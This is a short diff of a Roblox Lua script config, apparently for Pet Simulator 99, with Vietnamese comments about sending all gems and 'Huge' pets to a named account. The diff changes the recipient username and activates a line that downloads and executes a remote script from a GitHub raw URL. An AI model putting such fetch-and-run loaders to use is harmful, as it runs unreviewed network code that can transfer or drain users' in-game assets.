@@ -1,5 +1,5 @@
 --- Tài Khoản Nhận Huge Và Gems ---
-getgenv().usernames = {"baanhlalinh22"}
+getgenv().usernames = {"chacmaisaunay"}
 
 --- Gửi Tất Cả Gems ---
---loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Gems"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Gems"))()
